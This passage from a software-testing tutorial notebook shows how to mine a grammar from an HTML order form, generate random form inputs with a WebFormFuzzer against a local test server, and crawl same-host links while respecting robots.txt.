<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>{&#39;&lt;start&gt;&#39;: [&#39;&lt;action&gt;?&lt;query&gt;&#39;],
 &#39;&lt;string&gt;&#39;: [&#39;&lt;letter&gt;&#39;, &#39;&lt;letter&gt;&lt;string&gt;&#39;],
 &#39;&lt;letter&gt;&#39;: [&#39;&lt;plus&gt;&#39;, &#39;&lt;percent&gt;&#39;, &#39;&lt;other&gt;&#39;],
 &#39;&lt;plus&gt;&#39;: [&#39;+&#39;],
 &#39;&lt;percent&gt;&#39;: [&#39;%&lt;hexdigit-1&gt;&lt;hexdigit&gt;&#39;],
 &#39;&lt;hexdigit&gt;&#39;: [&#39;0&#39;,
  &#39;1&#39;,
  &#39;2&#39;,
  &#39;3&#39;,
  &#39;4&#39;,
  &#39;5&#39;,
  &#39;6&#39;,
  &#39;7&#39;,
  &#39;8&#39;,
  &#39;9&#39;,
  &#39;a&#39;,
  &#39;b&#39;,
  &#39;c&#39;,
  &#39;d&#39;,
  &#39;e&#39;,
  &#39;f&#39;],
 &#39;&lt;other&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;-&#39;, &#39;_&#39;],
 &#39;&lt;text&gt;&#39;: [&#39;&lt;string&gt;&#39;],
 &#39;&lt;number&gt;&#39;: [&#39;&lt;digits&gt;&#39;],
 &#39;&lt;digits&gt;&#39;: [&#39;&lt;digit&gt;&#39;, &#39;&lt;digits&gt;&lt;digit&gt;&#39;],
 &#39;&lt;digit&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;],
 &#39;&lt;checkbox&gt;&#39;: [&#39;&lt;_checkbox&gt;&#39;],
 &#39;&lt;_checkbox&gt;&#39;: [&#39;on&#39;, &#39;off&#39;],
 &#39;&lt;email&gt;&#39;: [&#39;&lt;_email&gt;&#39;],
 &#39;&lt;_email&gt;&#39;: [&#39;&lt;string&gt;%40&lt;string&gt;&#39;],
 &#39;&lt;hexdigit-1&gt;&#39;: [&#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;],
 &#39;&lt;submit&gt;&#39;: [&#39;&#39;],
 &#39;&lt;action&gt;&#39;: [&#39;/order&#39;],
 &#39;&lt;item&gt;&#39;: [&#39;item=&lt;item-value&gt;&#39;],
 &#39;&lt;item-value&gt;&#39;: [&#39;tshirt&#39;, &#39;drill&#39;, &#39;lockset&#39;],
 &#39;&lt;name&gt;&#39;: [&#39;name=&lt;text&gt;&#39;],
 &#39;&lt;email-1&gt;&#39;: [&#39;email=&lt;email&gt;&#39;],
 &#39;&lt;city&gt;&#39;: [&#39;city=&lt;text&gt;&#39;],
 &#39;&lt;zip&gt;&#39;: [&#39;zip=&lt;number&gt;&#39;],
 &#39;&lt;terms&gt;&#39;: [&#39;terms=&lt;checkbox&gt;&#39;],
 &#39;&lt;submit-1&gt;&#39;: [&#39;submit=&lt;submit&gt;&#39;],
 &#39;&lt;query&gt;&#39;: [&#39;&lt;item&gt;&amp;&lt;name&gt;&amp;&lt;email-1&gt;&amp;&lt;city&gt;&amp;&lt;zip&gt;&amp;&lt;terms&gt;&amp;&lt;submit-1&gt;&#39;]}
</pre></div>
</div>
</div>
</div>
<p>Let us take a look into the structure of the grammar.  It produces URL paths of this form:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;start&gt;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;&lt;action&gt;?&lt;query&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<p>Here, the <code class="docutils literal notranslate"><span class="pre">&lt;action&gt;</span></code> comes from the <code class="docutils literal notranslate"><span class="pre">action</span></code> attribute of the HTML form:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;action&gt;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;/order&#39;]
</pre></div>
</div>
</div>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">&lt;query&gt;</span></code> is composed of the individual field items:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;query&gt;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;&lt;item&gt;&amp;&lt;name&gt;&amp;&lt;email-1&gt;&amp;&lt;city&gt;&amp;&lt;zip&gt;&amp;&lt;terms&gt;&amp;&lt;submit-1&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<p>Each of these fields has the form <code class="docutils literal notranslate"><span class="pre">&lt;field-name&gt;=&lt;field-type&gt;</span></code>, where <code class="docutils literal notranslate"><span class="pre">&lt;field-type&gt;</span></code> is already defined in the grammar:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;zip&gt;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;zip=&lt;number&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;terms&gt;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;terms=&lt;checkbox&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<p>These are the query URLs produced from the grammar.  We see that these are similar to the ones produced from our hand-crafted grammar, except that the string values for names, email addresses, and cities are now completely random:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">order_fuzzer</span> <span class="o">=</span> <span class="n">GrammarFuzzer</span><span class="p">(</span><span class="n">grammar</span><span class="p">)</span>
<span class="p">[</span><span class="n">order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">)]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;/order?item=drill&amp;name=++%61&amp;email=%6e%40b++&amp;city=0&amp;zip=88&amp;terms=on&amp;submit=&#39;,
 &#39;/order?item=tshirt&amp;name=%3f&amp;email=21+%40+&amp;city=++&amp;zip=4&amp;terms=off&amp;submit=&#39;,
 &#39;/order?item=drill&amp;name=2&amp;email=%62%40++%4d1++_%77&amp;city=e%5d&amp;zip=1&amp;terms=on&amp;submit=&#39;]
</pre></div>
</div>
</div>
</div>
<p>We can again feed these directly into our Web browser:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">())))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] INSERT INTO orders VALUES ('drill', ' ', '5F @p   a ', 'cdb', '3230')
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET /order?item=drill&name=+&email=5F+%40p+++a+&city=cdb&zip=3230&terms=on&submit= HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook Rotary Hammer</strong> to   in cdb, 3230<br>
  A confirmation mail will be sent to 5F @p   a .
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<p>We see (one more time) that we can mine a grammar automatically from given data.</p>
</section>
<section id="a-fuzzer-for-web-forms">
<h3>A Fuzzer for Web Forms<a class="headerlink" href="#a-fuzzer-for-web-forms" title="Link to this heading">#</a></h3>
<p>To make things most convenient, let us define a <code class="docutils literal notranslate"><span class="pre">WebFormFuzzer</span></code> class that does everything in one place.  Given a URL, it extracts its HTML content, mines the grammar and then produces inputs for it.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">WebFormFuzzer</span><span class="p">(</span><span class="n">GrammarFuzzer</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;A Fuzzer for Web forms&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span>
                 <span class="n">grammar_miner_class</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">type</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
                 <span class="o">**</span><span class="n">grammar_fuzzer_options</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Constructor.</span>
<span class="sd">        `url` - the URL of the Web form to fuzz.</span>
<span class="sd">        `grammar_miner_class` - the class of the grammar miner</span>
<span class="sd">            to use (default: `HTMLGrammarMiner`)</span>
<span class="sd">        Other keyword arguments are passed to the `GrammarFuzzer` constructor</span>
<span class="sd">        &quot;&quot;&quot;</span>

        <span class="k">if</span> <span class="n">grammar_miner_class</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
            <span class="n">grammar_miner_class</span> <span class="o">=</span> <span class="n">HTMLGrammarMiner</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">grammar_miner_class</span> <span class="o">=</span> <span class="n">grammar_miner_class</span>

        <span class="c1"># We first extract the HTML form and its grammar...</span>
        <span class="n">html_text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_html</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">grammar</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_grammar</span><span class="p">(</span><span class="n">html_text</span><span class="p">)</span>

        <span class="c1"># ... and then initialize the `GrammarFuzzer` superclass with it</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">grammar</span><span class="p">,</span> <span class="o">**</span><span class="n">grammar_fuzzer_options</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_html</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Retrieve the HTML text for the given URL `url`.</span>
<span class="sd">        To be overloaded in subclasses.&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_grammar</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html_text</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Obtain the grammar for the given HTML `html_text`.</span>
<span class="sd">        To be overloaded in subclasses.&quot;&quot;&quot;</span>
        <span class="n">grammar_miner</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">grammar_miner_class</span><span class="p">(</span><span class="n">html_text</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">grammar_miner</span><span class="o">.</span><span class="n">mine_grammar</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>All it now takes to fuzz a Web form is to provide its URL:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_fuzzer</span> <span class="o">=</span> <span class="n">WebFormFuzzer</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
<span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order?item=lockset&amp;name=%6b+&amp;email=+%40b5&amp;city=%7e+5&amp;zip=65&amp;terms=on&amp;submit=&#39;
</pre></div>
</div>
</div>
</div>
<p>We can combine the fuzzer with a <code class="docutils literal notranslate"><span class="pre">WebRunner</span></code> as defined above to run the resulting fuzz inputs directly on our Web server:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_runner</span> <span class="o">=</span> <span class="n">WebRunner</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
<span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">runs</span><span class="p">(</span><span class="n">web_form_runner</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[(&#39;http://127.0.0.1:8800/order?item=drill&amp;name=+%6d&amp;email=%40%400&amp;city=%64&amp;zip=9&amp;terms=on&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=lockset&amp;name=++&amp;email=%63%40d&amp;city=_&amp;zip=6&amp;terms=on&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=lockset&amp;name=+&amp;email=d%40_-&amp;city=2++0&amp;zip=1040&amp;terms=off&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=tshirt&amp;name=%4bb&amp;email=%6d%40+&amp;city=%7a%79+&amp;zip=13&amp;terms=off&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=lockset&amp;name=d&amp;email=%55+%40%74&amp;city=+&amp;zip=4&amp;terms=on&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=tshirt&amp;name=_+2&amp;email=1++%40+&amp;city=+&amp;zip=30&amp;terms=on&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=tshirt&amp;name=+&amp;email=a-%40+&amp;city=+%57&amp;zip=2&amp;terms=on&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=lockset&amp;name=%56&amp;email=++%40a%55ee%44&amp;city=+&amp;zip=01&amp;terms=off&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=tshirt&amp;name=%6fc&amp;email=++%40+&amp;city=a&amp;zip=25&amp;terms=off&amp;submit=&#39;,
  &#39;PASS&#39;),
 (&#39;http://127.0.0.1:8800/order?item=drill&amp;name=55&amp;email=3%3e%40%405&amp;city=%4c&amp;zip=0&amp;terms=off&amp;submit=&#39;,
  &#39;PASS&#39;)]
</pre></div>
</div>
</div>
</div>
<p>While convenient to use, this fuzzer is still very rudimentary:</p>
<ul class="simple">
<li><p>It is limited to one form per page.</p></li>
<li><p>It only supports <code class="docutils literal notranslate"><span class="pre">GET</span></code> actions (i.e., inputs encoded into the URL).  A full Web form fuzzer would have to at least support <code class="docutils literal notranslate"><span class="pre">POST</span></code> actions.</p></li>
<li><p>The fuzzer is build on HTML only.  There is no Javascript handling for dynamic Web pages.</p></li>
</ul>
<p>Let us clear any pending messages before we get to the next section:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">clear_httpd_messages</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="crawling-user-interfaces">
<h2>Crawling User Interfaces<a class="headerlink" href="#crawling-user-interfaces" title="Link to this heading">#</a></h2>
<p>So far, we have assumed there would be only one form to explore.  A real Web server, of course, has several pages – and possibly several forms, too.  We define a simple <em>crawler</em> that explores all the links that originate from one page.</p>
<p>Our crawler is pretty straightforward.  Its main component is again a <code class="docutils literal notranslate"><span class="pre">HTMLParser</span></code> that analyzes the HTML code for links of the form</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&lt;link&gt;&quot;</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>and saves all the links found in a list called <code class="docutils literal notranslate"><span class="pre">links</span></code>.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">LinkHTMLParser</span><span class="p">(</span><span class="n">HTMLParser</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Parse all links found in a HTML page&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">reset</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">reset</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">links</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">handle_starttag</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">attrs</span><span class="p">):</span>
        <span class="n">attributes</span> <span class="o">=</span> <span class="p">{</span><span class="n">attr_name</span><span class="p">:</span> <span class="n">attr_value</span> <span class="k">for</span> <span class="n">attr_name</span><span class="p">,</span> <span class="n">attr_value</span> <span class="ow">in</span> <span class="n">attrs</span><span class="p">}</span>

        <span class="k">if</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span> <span class="ow">and</span> <span class="s2">&quot;href&quot;</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
            <span class="c1"># print(&quot;Found:&quot;, tag, attributes)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">links</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">attributes</span><span class="p">[</span><span class="s2">&quot;href&quot;</span><span class="p">])</span>
</pre></div>
</div>
</div>
</div>
<p>The actual crawler comes as a <em>generator function</em> <code class="docutils literal notranslate"><span class="pre">crawl()</span></code> which produces one URL after another.  By default, it returns only URLs that reside on the same host; the parameter <code class="docutils literal notranslate"><span class="pre">max_pages</span></code> controls how many pages (default: 1) should be scanned.  We also respect the <code class="docutils literal notranslate"><span class="pre">robots.txt</span></code> file on the remote site to check which pages we are allowed to scan.</p>
<section id="excursion-implementing-a-crawler">
<h3>Excursion: Implementing a Crawler<a class="headerlink" href="#excursion-implementing-a-crawler" title="Link to this heading">#</a></h3>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">collections</span><span class="w"> </span><span class="kn">import</span> <span class="n">deque</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.robotparser</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">crawl</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">max_pages</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">float</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">same_host</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Return the list of linked URLs from the given URL.</span>
<span class="sd">    `max_pages` - the maximum number of pages accessed.</span>
<span class="sd">    `same_host` - if True (default), stay on the same host&quot;&quot;&quot;</span>

    <span class="n">pages</span> <span class="o">=</span> <span class="n">deque</span><span class="p">([(</span><span class="n">url</span><span class="p">,</span> <span class="s2">&quot;&lt;param&gt;&quot;</span><span class="p">)])</span>
    <span class="n">urls_seen</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="n">rp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">robotparser</span><span class="o">.</span><span class="n">RobotFileParser</span><span class="p">()</span>
    <span class="n">rp</span><span class="o">.</span><span class="n">set_url</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s2">&quot;/robots.txt&quot;</span><span class="p">))</span>
    <span class="n">rp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">pages</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">max_pages</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">page</span><span class="p">,</span> <span class="n">referrer</span> <span class="o">=</span> <span class="n">pages</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">rp</span><span class="o">.</span><span class="n">can_fetch</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">,</span> <span class="n">page</span><span class="p">):</span>
            <span class="c1"># Disallowed by robots.txt</span>
            <span class="k">continue</span>

        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
        <span class="n">max_pages</span> <span class="o">-=</span> <span class="mi">1</span>

        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error &quot;</span> <span class="o">+</span> <span class="nb">repr</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;: &quot;</span> <span class="o">+</span> <span class="n">page</span><span class="p">,</span>
                  <span class="s2">&quot;(referenced from &quot;</span> <span class="o">+</span> <span class="n">referrer</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">,</span>
                  <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="n">content_type</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;content-type&quot;</span><span class="p">]</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">content_type</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;text/html&quot;</span><span class="p">):</span>
            <span class="k">continue</span>

        <span class="n">parser</span> <span class="o">=</span> <span class="n">LinkHTMLParser</span><span class="p">()</span>
        <span class="n">parser</span><span class="o">.</span><span class="n">feed</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">parser</span><span class="o">.</span><span class="n">links</span><span class="p">:</span>
            <span class="n">target_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">link</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">same_host</span> <span class="ow">and</span> <span class="n">urlsplit</span><span class="p">(</span>
                    <span class="n">target_url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span> <span class="o">!=</span> <span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span><span class="p">:</span>
                <span class="c1"># Different host</span>
                <span class="k">continue</span>

            <span class="k">if</span> <span class="n">urlsplit</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span><span class="o">.</span><span class="n">fragment</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
                <span class="c1"># Ignore #fragments</span>
                <span class="k">continue</span>

            <span class="k">if</span> <span class="n">target_url</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">urls_seen</span><span class="p">:</span>
                <span class="n">pages</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">target_url</span><span class="p">,</span> <span class="n">page</span><span class="p">))</span>
                <span class="n">urls_seen</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
                <span class="k">yield</span> <span class="n">target_url</span>

        <span class="k">if</span> <span class="n">page</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">urls_seen</span><span class="p">:</span>
            <span class="n">urls_seen</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
            <span class="k">yield</span> <span class="n">page</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id2">
<h3>End of Excursion<a class="headerlink" href="#id2" title="Link to this heading">#</a></h3>
<p>We can run the crawler on our own server, where it will quickly return the order page and the terms and conditions page.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">crawl</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">):</span>
    <span class="n">print_httpd_messages</span><span class="p">()</span>
    <span class="n">print_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET /robots.txt HTTP/1.1" 404 -
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET / HTTP/1.1" 200 -
</pre></div><div class="output text_html"><pre><a href="http://127.0.0.1:8800/terms">http://127.0.0.1:8800/terms</a></pre></div><div class="output text_html"><pre><a href="http://127.0.0.1:8800">http://127.0.0.1:8800</a></pre></div></div>
</div>
<p>We can also crawl over other sites, such as the home page of this project.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">crawl</span><span class="p">(</span><span class="s2">&quot;https://www.fuzzingbook.org/&quot;</span><span class="p">):</span>
    <span class="n">print_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre><a href="https://www.fuzzingbook.org/">https://www.fuzzingbook.org/</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/00_Table_of_Contents.html">https://www.fuzzingbook.org/html/00_Table_of_Contents.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/01_Intro.html">https://www.fuzzingbook.org/html/01_Intro.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Tours.html">https://www.fuzzingbook.org/html/Tours.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Intro_Testing.html">https://www.fuzzingbook.org/html/Intro_Testing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html">https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Fuzzer.html">https://www.fuzzingbook.org/html/Fuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/Coverage.html">https://www.fuzzingbook.org/html/Coverage.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/MutationFuzzer.html">https://www.fuzzingbook.org/html/MutationFuzzer.html</a></pre></div><div class="output text_html"><pre><a href="https://www.fuzzingbook.org/html/GreyboxFuzzer.html">https://www.fuzzingbook.org/html/GreyboxFuzzer.html</a></pre></div><div class="output text_html"><pre><a 